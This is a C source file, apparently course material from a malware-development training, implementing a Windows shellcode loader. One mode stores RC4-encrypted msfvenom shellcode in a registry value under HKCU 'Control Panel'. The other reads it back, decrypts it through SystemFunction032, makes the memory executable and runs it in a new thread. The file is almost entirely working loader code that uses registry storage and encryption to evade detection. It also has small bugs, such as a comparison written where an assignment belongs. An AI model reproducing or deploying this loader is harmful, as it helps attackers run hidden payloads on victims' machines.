#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "Advapi32.lib")  // Used to compile RegGetValueA

// Uncomment one of the following to enable read / write mode:
//\
# define WRITEMODE
//
#define READMODE

#define REGISTRY	"Control Panel"
#define REGSTRING	"MalDevAcademy"

#ifdef READMODE

// Output from HellShell: `HellShell.exe calc.bin rc4`

typedef struct {
	DWORD length;
	DWORD maximumLength;
	PVOID buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* img,
	struct USTRING* key
);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS	status = NULL;
	USTRING		key = { .buffer = pRc4Key, .length = dwRc4KeySize, .maximumLength = dwRc4KeySize },
				img = { .buffer = pPayloadData, .length = sPayloadSize, .maximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((status == SystemFunction032(&img, &key)) != 0x0) {
		printf("[!] SystemFunction032 failed with error: 0x%0.8X\n", status);
		return FALSE;
	}

	return TRUE;

}

unsigned char Rc4Key[] = {
	0x8B, 0x9E, 0x3F, 0xC0, 0x3E, 0x31, 0xBF, 0xCF, 0xA5, 0x83, 0x7C, 0xC8, 0x6A, 0x61, 0x96, 0x9A
};


BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

	LSTATUS		status = NULL;
	
	DWORD		dwBytesRead = NULL;	
	PVOID		pBytes = NULL;

	/*
	* LSTATUS RegGetValueA(
		[in]                HKEY    hkey,     // A handle to an open registry key
		[in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
		[in, optional]      LPCSTR  lpValue,  // The name of the registry value.
		[in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
		[out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
		[out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
		[in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
	* );
	*/
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea

	// Fetch the payload's size
	status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegGetValueA failed with error: %d\n", status);
		return FALSE;
	}

	// Allocate heap that will store the payload being read
	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
	if (pBytes == NULL) {
		printf("[!] HeapAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	// Read the payload from the `REGISTRY` key, from value `REGSTRING`
	status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegGetValueA failed with error: %d\n", status);
		return FALSE;
	}

	// Save values
	*ppPayload = pBytes;
	*psSize = dwBytesRead;

	return TRUE;

}

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID	pShellcodeAddress = NULL;
	DWORD	dwOldProtection = NULL;

	/*
	* LPVOID VirtualAlloc(
		 [in, optional] LPVOID lpAddress,
		 [in]           SIZE_T dwSize,
		 [in]           DWORD  flAllocationType,
		 [in]           DWORD  flProtect
	* );	
	*/

	/*
	* BOOL VirtualProtect(
		 [in]  LPVOID lpAddress,
		 [in]  SIZE_T dwSize,
		 [in]  DWORD  flNewProtect,
		 [out] PDWORD lpflOldProtect
	* );
	*/

	/*
	* HANDLE CreateThread(
		[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		[in]            SIZE_T                  dwStackSize,
		[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
		[in, optional]  __drv_aliasesMem LPVOID lpParameter,
		[in]            DWORD                   dwCreationFlags,
		[out, optional] LPDWORD                 lpThreadId
	* );
	*/

	// Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.
	// Memory allocated by this function is automatically initialized to zero.
	// To allocate memory in the address space of another process, use the VirtualAllocEx function.
	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated memory at: 0x%p\n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
	memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

	// Changes the protection on a region of committed pages in the virtual address space of the calling process.
	// To change the access protection of any process, use the VirtualProtectEx function.
	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
		return FALSE;
	}

	printf("Press <Enter> to run...");
	getchar();

	// Creates a thread to execute within the virtual address space of the calling process.
	// To create a thread that runs in the virtual address space of another process, use the CreateRemoteThread function.
	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
	if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateThread failed with error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;

}

#endif  // READMODE

#ifdef WRITEMODE

// Msfvenom x64 calc shellcode encrypted by HellShell (RC4)
unsigned char Rc4CipherText[] = {};

BOOL WriteShellcodeToRegistry(IN BYTE pShellcode, IN DWORD dwShellcodeSize) {

	BOOL		bState = TRUE;
	LSTATUS		status = NULL;
	HKEY		hKey = NULL;

	/*
	* LSTATUS RegOpenKeyExA(
		[in]           HKEY   hKey, 		// A handle to an open registry key
		[in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
		[in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
		[in]           REGSAM samDesired, 	// Access Rights
		[out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
	* );
	*/

	/*
	* LSTATUS RegSetValueExA(
		[in]           HKEY       hKey,            // A handle to an open registry key
		[in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
					   DWORD      Reserved,        // Set to 0
		[in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
		[in]           const BYTE *lpData,         // The data to be stored
		[in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
	* );
	*/

	printf("[i] Writing 0x%p [Size: %ld] to \"%s\\%s\"...", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

	// The RegOpenKeyExA WinAPI is used to open a handle to the specified registry key,
	// ... which is a prerequisite to creating, editing or deleting values under the registry key.
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
	status = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExA failed with error: %d\n", status);
		bState = FALSE;
		goto _EndOfFunction;
	}

	// The RegSetValueExA WinAPI is used which takes the opened handle from RegOpenKeyExA and creates a new value that is based on the second parameter, REGSTRING.
	// It will also write the payload to the newly created value.
	// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
	status = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
	if (status != ERROR_SUCCESS) {
		printf("[!] RegSetValueExA failed with error: %d\n", status);
		bState = FALSE;
		goto _EndOfFunction;
	}

	printf("[+] Done!\n");

_EndOfFunction:
	if (hKey)
		// RegCloseKey is used to close the handle of the registry key that was opened.
		// https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
		RegCloseKey(hKey);
	return bState;

}

#endif  // WRITEMODE

int main(int argc, char* argv[]) {

#ifdef WRITEMODE

	// Write the shellcode to the registry
	printf("[#] Press <Enter> to write the shellcode to the registry...");
	getchar();
	if (!WriteShellcodeToRegistry(Rc4CipherText, sizeof(Rc4CipherText)))
		return -1;

	goto _EndOfFunction;

#endif  // WRITEMODE

#ifdef READMODE

	PVOID	pBytes = NULL;
	SIZE_T	sSize = NULL;

	printf("[#] Press <Enter> to read the shellcode from the registry...");
	getchar();

	// Read the shellcode
	printf("[i] Reading shellcode...\n");
	if (!ReadShellcodeFromRegistry(&pBytes, &sSize))
		return -1;
	printf("[+] DONE!\n");
	printf("[+] Payload of Size [%d] | Read at: 0x%p \n", sSize, pBytes);

	// Decrypt the shellcode
	printf("Press <Enter> to decrypt the shellcode...");
	getchar();
	printf("Decrypting shellcode...\n");
	if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBytes, sizeof(Rc4Key), sSize))
		return -1;
	printf("[+] DONE!\n");

	// Run the shellcode
	if (!RunShellcode(pBytes, sSize))
		return -1;

	HeapFree(GetProcessHeap(), 0, pBytes);

#endif  // READMODE

_EndOfFunction:
	printf("[#] Press <Enter> to quit...");
	getchar();
	return 0;

}